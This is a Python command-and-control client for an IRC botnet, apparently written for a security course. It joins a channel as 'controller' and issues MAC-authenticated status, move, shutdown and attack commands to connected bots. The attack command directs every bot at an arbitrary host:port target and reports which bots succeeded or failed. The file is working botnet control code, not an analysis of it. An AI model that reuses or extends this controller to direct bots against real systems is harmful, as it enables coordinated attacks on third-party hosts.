#!/bin/env python3

import argparse
import random
import socket
import sys
import time
import hashlib
import select

SECRET = None
CHANNEL = None

nonce = random.randint(0, 99) #initial nonce would be a value from 0-99


def parse_args():
    '''
    parsing of inputs logic 
    needs the hostport, channel and secret
    '''
    parser = argparse.ArgumentParser(
        prog='client',
        description='client connects to server')
    parser.add_argument("hostport", help="<hostname>:<port>")
    parser.add_argument("channel", help="Channel for the irc server")
    parser.add_argument("secret", help="Secret key for authentication")
    return parser.parse_args()



def status(sock):
    '''
    provides the status of bots
    '''
    global CHANNEL
    nonce, mac = calculate_mac() #calculating the mac
    
    sock.sendall(f"PRIVMSG #{CHANNEL} :{nonce} {mac} status\r\n".encode()) # triggers status command on bots
    responses = wait_responses("status", sock) # waiting for responses
    print(f"  Result: {len(responses)} bots replied.")
    #formatting responses 
    formatted_responses = [] 
    for response in responses:
        parts = response.split()
        nick = parts[1]
        count = parts[2]
        formatted_responses.append(f"{nick} ({count})")
    formatted_responses = ", ".join(formatted_responses)
    if(len(responses) > 0): print(f"    {formatted_responses}")

def shutdown(sock):
    '''
    shutdown  bots
    '''
    global CHANNEL
    nonce, mac = calculate_mac()
    sock.sendall(f"PRIVMSG #{CHANNEL} :{nonce} {mac} shutdown\r\n".encode()) # triggers shutdown command on bots
    responses = wait_responses("shutdown", sock)
    print(f"  Result: {len(responses)} bots shut down.")
    #formatting responses 
    formatted_responses = []
    for response in responses:
        parts = response.split()
        nick = parts[1]
        formatted_responses.append(f"{nick}")
    formatted_responses = ", ".join(formatted_responses)
    if(len(responses) > 0): print(f"    {formatted_responses}")
    
def move(sock, cmd):
    '''
    move  bots to a new IRC server
    '''
    global CHANNEL
    nonce, mac = calculate_mac()
    sock.sendall(f"PRIVMSG #{CHANNEL} :{nonce} {mac} move  {cmd[1]} {cmd[2]}\r\n".encode()) # triggers shutdown command on bots
    responses = wait_responses("move", sock) #waiting for responses
    print(f"  Result: {len(responses)} bots moved.")
    #formatting responses 
    formatted_responses = []
    for response in responses:
        parts = response.split()
        nick = parts[1]
        formatted_responses.append(f"{nick}")
    formatted_responses = ", ".join(formatted_responses)
    if(len(responses) > 0): print(f"    {formatted_responses}")
    
    
def attack(sock, cmd):
    '''
    triggers the attacking commnand on all bots 
    involves formatting of strings
    '''
    global CHANNEL
    nonce, mac = calculate_mac()
    sock.sendall(f"PRIVMSG #{CHANNEL} :{nonce} {mac} attack {cmd[1]}\r\n".encode())
    responses = wait_responses("attack", sock)
    successful_responses = []
    failed_responses = []
    # -attack bot-2 FAIL timeout
    for response in responses:
        response_arr = response.split()
        if response_arr[2] == "FAIL":
            failed_responses.append(f"    {response_arr[1]}: {' '.join(response_arr[3:])}")
        else:
            successful_responses.append(response_arr[1])
            
    print(f"  Result: {len(successful_responses)} bots attacked successfully:")
    formatted_responses = ", ".join(successful_responses)
    if(len(successful_responses) > 0): print(f"    {formatted_responses}")
    print(f"  Result: {len(failed_responses)} bots failed to attack:")
    if(len(failed_responses) > 0):
        for failed_response in failed_responses:
            print(failed_response)

def wait_responses(cmd, sock):
    '''waits for responses for 5 seconds and responses are formatted so that only
    the ones of cmd would be. [-status ..., -shutdown ...]
    if cmd is status, then responses would be  [-status ...]
    '''
    global CHANNEL
    responses = ""
    print("  Waiting 5s to gather replies.")
    start_time = time.time()
    while time.time() - start_time < 5: 
        ready, _, _ = select.select([sock], [], [], 1)  # wait up to 1s
        if ready:
            response = sock.recv(4096).decode()
            responses += response
    #string formatting
    #print(responses)
    responses = responses.strip()
    responses = responses.split("\n")
    #print(responses)
    responses = [response.strip() for response in responses if 'PRIVMSG' in response.strip()]
    #print(responses)
    responses = [response.split('PRIVMSG')[1].strip()[1:] for response in responses]
    responses = [response.split(f'{CHANNEL}')[1].strip()[1:] for response in responses]
    #print(responses)
    return responses

def calculate_mac():
    #calculate the mac using the sha256 of nonce + secret
    global nonce, SECRET
    nonce += 1
    mac = hashlib.sha256((str(nonce) + SECRET).encode()).hexdigest()[:8]
    return nonce,mac

def handle_command(sock, cmd):
    '''this is where the commands are handle for status, attack, move and shutdown'''
    cmd = cmd.strip().split()
    
    #check if all commands are in the if statements
    if(cmd[0] == "status"):
        if(len(cmd) != 1):
            print("  Invalid status usage, please use status only")
        status(sock)
        
    elif(cmd[0] == "attack"):
        if(len(cmd) != 2):
            print("  Invalid attack usage, please use 2 args")
            return
        if(":" not in cmd[1]):
            print("Did not provide correct hostport")
            return
        attack(sock, cmd)
        
    elif(cmd[0] == "move"):
        if(len(cmd) != 3):
            print("  Invalid move usage, please use 3 args such as move hostname:port channel")
            return
        if(":" not in cmd[1]):
            print("Did not provide correct hostport")
            return
        move(sock, cmd)
        
    elif(cmd[0] == "shutdown"):
        if(len(cmd) != 1):
            print("  Invalid shutdown usage, please use shutdown only")
        shutdown(sock)
        
    elif(cmd[0] == "quit"):
        if(len(cmd) != 1):
            print("  Invalid quit usage, please use quit only")
        print("Disconnected")
        exit(0)
       
    #handles commands that are not in if statements 
    else:
        print("Wrong command input")

def main():
    '''
    parsing of args and assigning values to global vars 
    are done in this function
    Also there is the socket connection
    '''
    global SECRET, CHANNEL
    args = parse_args()
    try:
        host, port = args.hostport.split(":")
        port = int(port)
    except ValueError:
        print("Error: Invalid <hostname>:<port> format. Expected 'hostname:port'.")
        exit(1)
    CHANNEL = args.channel
    SECRET = args.secret
    show_cmd = True # bool that shows print(cmd on the console)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.sendall(f"NICK controller \r\n".encode())
        sock.sendall(f"USER controller * * controller \r\n".encode())
        sock.sendall(f"JOIN #{CHANNEL}\r\n".encode())
        sock.recv(4096).decode()
        print("Connected")
        
        while True:
            
            if show_cmd:
                sys.stdout.write("cmd> ") 
                sys.stdout.flush() # makes sure that the cmd is printed
            ready, _, _ = select.select([sock, sys.stdin], [], [], 1)
            
            #not show command  every loop
            show_cmd = False

            #when we receive a ping from the server
            if sock in ready:
                response = sock.recv(4096).decode().strip()
                #print(f"\nServer: {response}")  #debugging output

                #handle PING messages
                if response.startswith("PING"):
                    token = response.split("PING")[1].strip()
                    sock.sendall(f"PONG {token}\r\n".encode())

            #receive input from server
            if sys.stdin in ready:
                show_cmd = True
                cmd = input().strip()
                handle_command(sock, cmd)
            
        
            
    #handling of errors
    except ConnectionRefusedError: # error due to server not starting
        sock.close()
        print("Failed to connect.")
        exit(1)
            
    except socket.gaierror as e: #no hostname
        print(f"no such hostname")  
        exit(1) 
            
    except Exception as e: #errors due to server disconnecting
        sock.close()
        print("Disconnected")
        exit(1)
        
        

if __name__ == "__main__":
    main()
